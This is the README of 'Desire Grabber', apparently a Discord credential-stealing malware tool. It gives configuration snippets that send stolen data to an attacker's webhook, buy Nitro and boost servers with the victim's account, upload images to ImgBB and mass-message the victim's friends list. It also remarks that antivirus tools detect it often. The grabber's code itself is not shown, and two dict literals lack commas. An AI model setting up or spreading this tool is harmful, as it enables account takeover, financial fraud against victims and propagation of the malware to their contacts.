# Desire Grabber
- Multiple features, but the downside is the amount of detections it gets.

# Normal Usage
Add this to the bottom of the code:
```py
if __name__ == "__main__":
    desire = Desire(
        webhook="https://your-webhook.com/",
        ping="@everyone / <@user_id>",
        nitro={
            "identifier": "boost"
            "duration": "month"
        },
        boost={
            "invite": "discord-developers",
            "guild_id": 0000000000000000
        },
        imgbb="ImgBB API Key",
        direct_message="Mass DM Friends List Message."
    )
    desire.start()
```

# Module Usage
```py
from main import Desire

if __name__ == "__main__":
    desire = Desire(
        webhook="https://your-webhook.com/",
        ping="@everyone / <@user_id>",
        nitro={
            "identifier": "boost"
            "duration": "month"
        },
        boost={
            "invite": "discord-developers",
            "guild_id": 0000000000000000
        },
        imgbb="ImgBB API Key",
        direct_message="Mass DM Friends List Message."
    )
    desire.start()
```
